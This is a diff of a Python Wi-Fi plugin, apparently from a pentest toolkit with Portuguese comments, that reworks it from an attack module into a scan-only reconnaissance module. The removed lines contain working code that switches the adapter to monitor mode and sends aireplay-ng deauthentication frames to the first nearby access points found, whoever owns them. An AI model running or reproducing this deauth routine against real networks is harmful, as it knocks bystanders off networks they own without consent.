@@ -1,80 +1,76 @@
-# plugins/wifi_attack.py
-def run(target, results):
+# plugins/wifi_attac.py
+def run(target, ip, open_ports, banners):
     """
-    Plugin de ataque wireless: scan, deauth e restauração de interface.
+    Plugin de reconhecimento wireless: scan de redes Wi-Fi.
+    Detecta OS e disponibilidade de ferramentas antes de executar.
     target: ignorado (operação local)
-    results: dicionário acumulador de resultados
+    Requer root/sudo e ferramentas aircrack-ng.
     """
     import subprocess
     import re
-    import time
-    from pathlib import Path
+    import platform
+    import shutil
+    import os
 
-    # 1. Descobrir interfaces wireless compatíveis
-    iw_dev_cmd = "iw dev"
-    iw_out = subprocess.getoutput(iw_dev_cmd)
-    interfaces = re.findall(r'Interface\s+([^\s]+)', iw_out)
-    if not interfaces:
-        results['wifi_attack'] = {'erro': 'Nenhuma interface wireless detectada! (precisa de placa compatível e root)'}
-        return
+    resultado = {}
+    sistema = platform.system()
 
-    iface = interfaces[0]
-    results['wifi_attack'] = {'interface': iface}
+    # Verificar se está rodando como root
+    if os.geteuid() != 0:
+        return {
+            "plugin": "wifi_attac",
+            "resultados": {"aviso": "Requer execução como root (sudo). Skipping."}
+        }
 
-    # 2. Colocar a interface em modo monitor
-    try:
-        subprocess.run(f"sudo ip link set {iface} down", shell=True, check=True)
-        subprocess.run(f"sudo iw dev {iface} set type monitor", shell=True, check=True)
-        subprocess.run(f"sudo ip link set {iface} up", shell=True, check=True)
-        time.sleep(1)
-    except Exception as e:
-        results['wifi_attack']['erro'] = f'Erro ao configurar modo monitor: {e}'
-        return
+    if sistema == "Darwin":
+        # macOS: usar airport para scan
+        airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
+        if not os.path.isfile(airport_path):
+            return {"plugin": "wifi_attac", "resultados": {"erro": "airport não encontrado (macOS)"}}
 
-    # 3. Scan de redes Wi-Fi (beacon dump)
-    scan_cmd = f"timeout 10s sudo airodump-ng --output-format csv -w /tmp/wifi_scan {iface}"
-    subprocess.run(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    csv_file = Path("/tmp/wifi_scan-01.csv")
-    if not csv_file.exists():
-        results['wifi_attack'].update({'erro': 'Falha no scan wireless ou permissão insuficiente.'})
-        # Tenta restaurar a interface para evitar problemas
-        subprocess.run(f"sudo ip link set {iface} down", shell=True)
-        subprocess.run(f"sudo iw dev {iface} set type managed", shell=True)
-        subprocess.run(f"sudo ip link set {iface} up", shell=True)
-        return
-
-    # 4. Parse dos resultados do scan
-    bssids = []
-    try:
-        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = f.readlines()
-        for line in lines:
-            if re.match(r"^([0-9A-Fa-f:]{17}),", line):
-                cols = line.split(',')
-                bssid = cols[0]
-                essid = cols[13].strip()
-                if essid and bssid:
-                    bssids.append({'bssid': bssid, 'essid': essid})
-    except Exception as e:
-        results['wifi_attack'].update({'erro': f'Falha ao processar scan: {e}'})
-        return
-
-    results['wifi_attack']['redes_encontradas'] = bssids
-
-    # 5. Opcional: deauth em todos os BSSIDs (lab/teste)
-    deauthed = []
-    for ap in bssids[:2]:  # Ajuste aqui se quiser atacar mais de 2 redes!
-        bssid = ap['bssid']
         try:
-            deauth_cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {iface}"
-            proc = subprocess.run(deauth_cmd, shell=True, timeout=8, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            deauthed.append({'bssid': bssid, 'saida': proc.stdout.decode(errors="ignore")})
+            proc = subprocess.run(
+                f"{airport_path} -s", shell=True, capture_output=True,
+                timeout=15, encoding="utf-8"
+            )
+            redes = []
+            for line in proc.stdout.splitlines()[1:]:
+                parts = line.split()
+                if len(parts) >= 7:
+                    redes.append({
+                        "ssid": parts[0],
+                        "bssid": parts[1],
+                        "rssi": parts[2],
+                        "channel": parts[3],
+                        "security": " ".join(parts[6:]),
+                    })
+            resultado["redes_encontradas"] = redes if redes else "Nenhuma rede encontrada"
         except Exception as e:
-            deauthed.append({'bssid': bssid, 'erro': str(e)})
+            resultado["erro"] = str(e)
 
-    results['wifi_attack']['deauth'] = deauthed
+    elif sistema == "Linux":
+        # Linux: usar iw + airodump-ng
+        if not shutil.which("iw"):
+            return {"plugin": "wifi_attac", "resultados": {"erro": "iw não encontrado no PATH"}}
 
-    # 6. Restaurar interface ao modo normal (managed)
-    subprocess.run(f"sudo ip link set {iface} down", shell=True)
-    subprocess.run(f"sudo iw dev {iface} set type managed", shell=True)
-    subprocess.run(f"sudo ip link set {iface} up", shell=True)
+        iw_out = subprocess.getoutput("iw dev")
+        interfaces = re.findall(r'Interface\s+([^\s]+)', iw_out)
+        if not interfaces:
+            return {"plugin": "wifi_attac", "resultados": {"erro": "Nenhuma interface wireless detectada"}}
+
+        iface = interfaces[0]
+        resultado["interface"] = iface
+
+        # Scan via iw (sem precisar de aircrack-ng)
+        try:
+            scan_out = subprocess.getoutput(f"sudo iw dev {iface} scan 2>/dev/null")
+            ssids = re.findall(r'SSID:\s+(.+)', scan_out)
+            bssids = re.findall(r'BSS\s+([0-9a-fA-F:]{17})', scan_out)
+            redes = [{"bssid": b, "ssid": s} for b, s in zip(bssids, ssids)]
+            resultado["redes_encontradas"] = redes if redes else "Nenhuma rede encontrada"
+        except Exception as e:
+            resultado["erro"] = str(e)
+    else:
+        resultado["erro"] = f"OS não suportado: {sistema}"
+
+    return {"plugin": "wifi_attac", "resultados": resultado}
